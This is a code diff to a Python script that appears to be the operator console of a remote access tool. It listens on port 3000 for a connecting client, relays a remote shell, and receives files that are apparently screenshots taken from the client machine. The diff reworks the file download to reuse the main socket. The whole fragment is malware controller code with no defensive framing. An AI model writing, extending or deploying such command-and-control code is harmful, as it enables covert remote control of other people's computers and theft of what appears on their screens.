@@ -13,7 +13,7 @@ def print_menu():
     print("6.) Exit\n\n")
 
 def establish_connection():
-    global conn_to_client
+    global conn_to_client, server
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind(("0.0.0.0", 3000))
     server.listen(0)
@@ -39,11 +39,8 @@ def open_shell():
         output = conn_to_client.recv(1024)
         print(output.decode())
 
-def download_file(): 
-    file_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    file_server.bind(("0.0.0.0", 3001))
-    file_server.listen(0)
-    file_server, add = file_server.accept()
+def download_file(file_path, file_name): 
+    file_server, address = server.accept()
     
     if not file_server:
         print("Could not establish connection with file server")
@@ -51,9 +48,8 @@ def download_file():
     
     file_size = int(file_server.recv(8).decode())
     
-    
     c = 0
-    file = open(f"screen_shot_{time.asctime(time.localtime(time.time()))}.png", "wb")
+    file = open(f"{file_path}{time.asctime(time.localtime(time.time()))}.png", "wb")
     while c <= file_size:
         file_buff = file_server.recv(1024)
         
